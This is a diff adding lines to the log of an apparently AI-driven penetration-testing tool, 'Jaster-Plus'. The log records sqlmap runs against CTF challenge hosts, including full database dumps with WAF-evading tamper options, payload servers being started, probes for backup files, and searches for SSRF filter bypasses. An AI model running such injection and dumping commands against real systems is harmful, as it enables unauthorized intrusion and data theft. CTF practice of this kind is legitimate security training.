@@ -292,3 +292,40 @@ httpx.ConnectError: All connection attempts failed
 2026-04-13 22:46:13,166 - primp - INFO - response: https://www.bing.com/search?q=PHP+blog+URL+validation+bypass+SSRF+filter+internal+localhost+filter+bypass 302
 2026-04-13 22:46:13,167 - duckduckgo_search.DDGS - INFO - Error to search using bing backend: https://www.bing.com/search?q=PHP+blog+URL+validation+bypass+SSRF+filter+internal+localhost+filter+bypass return None. params={'q': 'PHP blog URL validation bypass SSRF filter internal localhost filter bypass'} content=None data=None
 2026-04-13 22:46:13,167 - jaster.mcp.mcp_service - WARNING - web_search DDGS backend failed, falling back to HTML scraping: https://www.bing.com/search?q=PHP+blog+URL+validation+bypass+SSRF+filter+internal+localhost+filter+bypass return None. params={'q': 'PHP blog URL validation bypass SSRF filter internal localhost filter bypass'} content=None data=None
+2026-05-13 08:34:50,966 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://d829d9c8-2878-46aa-b59c-c1e9c4949881.node5.buuoj.cn:81/login.ok.php --batch --random-agent --level 3 --risk 1 --data username=admin&passwd=admin --batch
+2026-05-13 08:43:45,395 - jaster.mcp.mcp_service - ERROR - HTTP请求超时: http://node1.anna.nssctf.cn:23655/ - 
+2026-05-13 08:43:59,745 - jaster.mcp.mcp_service - ERROR - HTTP请求超时: http://node1.anna.nssctf.cn:23655/ - 
+2026-05-13 13:20:58,965 - jaster.mcp.mcp_service - ERROR - 专家分析工具执行失败
+Traceback (most recent call last):
+  File "/home/kali/桌面/Jaster-Plus/src/jaster/mcp/mcp_service.py", line 755, in expert_analysis
+    llm = get_llm_client()
+  File "/home/kali/桌面/Jaster-Plus/src/jaster/mcp/mcp_service.py", line 617, in get_llm_client
+    _llm_client = OpenAIChatClient()
+  File "/home/kali/桌面/Jaster-Plus/src/jaster/runtime/llm.py", line 33, in __init__
+    raise ValueError("OPENAI_API_KEY is required")
+ValueError: OPENAI_API_KEY is required
+2026-05-13 13:20:58,966 - jaster.mcp.mcp_service - ERROR - distill_knowledge tool execution failed
+Traceback (most recent call last):
+  File "/home/kali/桌面/Jaster-Plus/src/jaster/mcp/mcp_service.py", line 833, in distill_knowledge
+    llm = get_llm_client()
+  File "/home/kali/桌面/Jaster-Plus/src/jaster/mcp/mcp_service.py", line 617, in get_llm_client
+    _llm_client = OpenAIChatClient()
+  File "/home/kali/桌面/Jaster-Plus/src/jaster/runtime/llm.py", line 33, in __init__
+    raise ValueError("OPENAI_API_KEY is required")
+ValueError: OPENAI_API_KEY is required
+2026-05-13 13:21:09,307 - duckduckgo_search.DDGS - INFO - Error to search using bing backend: https://www.bing.com/search TimeoutError: ('error sending request for url (https://www.bing.com/search?q=test)', 'https://www.bing.com/search?q=test')
+2026-05-13 13:21:09,307 - jaster.mcp.mcp_service - WARNING - web_search DDGS backend failed, falling back to HTML scraping: https://www.bing.com/search TimeoutError: ('error sending request for url (https://www.bing.com/search?q=test)', 'https://www.bing.com/search?q=test')
+2026-05-13 13:21:40,783 - jaster.mcp.mcp_service - ERROR - HTTP连接错误: http://127.0.0.1:1/ - All connection attempts failed
+2026-05-13 13:22:00,799 - jaster.mcp.mcp_service - WARNING - NVD search failed: [Errno -3] Temporary failure in name resolution
+2026-05-13 13:24:53,018 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://127.0.0.1:1/test --batch --random-agent --level 1 --risk 1
+2026-05-13 13:24:56,682 - jaster.mcp.mcp_service - INFO - [PayloadServer] Started server ps_7e4ec5af on 0.0.0.0:19999
+2026-05-13 14:18:02,175 - jaster.mcp.mcp_service - ERROR - HTTP请求超时: http://node4.anna.nssf.cn:24052/ - 
+2026-05-13 14:18:17,193 - jaster.mcp.mcp_service - ERROR - HTTP请求超时: http://node4.anna.nssf.cn:24052/robots.txt - 
+2026-05-13 14:18:27,217 - jaster.mcp.mcp_service - ERROR - HTTP连接错误: http://node4.anna.nssf.cn:24052/user.php.bak - [Errno -5] No address associated with hostname
+2026-05-13 14:23:16,081 - jaster.mcp.mcp_service - ERROR - HTTP请求超时: http://node4.anna.nssctf.cn:24052/join.ok.php - 
+2026-05-13 14:25:24,766 - jaster.mcp.mcp_service - INFO - [PayloadServer] Started server ps_75602b72 on 0.0.0.0:18472
+2026-05-13 14:26:19,628 - jaster.mcp.mcp_service - INFO - [PayloadServer] Started server ps_5aba6a12 on 0.0.0.0:18080
+2026-05-13 14:27:49,298 - jaster.mcp.mcp_service - INFO - [PayloadServer] 192.168.73.1 - GET /test
+2026-05-13 14:27:49,391 - jaster.mcp.mcp_service - INFO - [PayloadServer] 192.168.73.1 - GET /favicon.ico
+2026-05-13 14:31:35,092 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:24052/view.php?no=1 --batch --random-agent --level 1 --risk 1 --batch --random-agent --level 3 --risk 2 --dump-all
+2026-05-13 14:38:07,819 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:24052/view.php?no=1 --batch --random-agent --tamper space2comment,randomcase --level 1 --risk 1 --batch --random-agent --time-sec 1
